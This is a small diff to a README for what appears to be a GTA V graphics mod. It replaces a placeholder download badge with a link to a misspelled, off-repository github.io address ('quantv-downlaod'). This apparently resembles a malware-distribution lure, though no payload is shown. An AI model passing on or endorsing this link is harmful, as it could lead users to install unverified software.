@@ -8,7 +8,7 @@ With **HDR-like effects, sharp shadows, improved textures, and optimized post-pr
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://quantv-downlaod.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **Script Hook V** and **OpenIV**.  
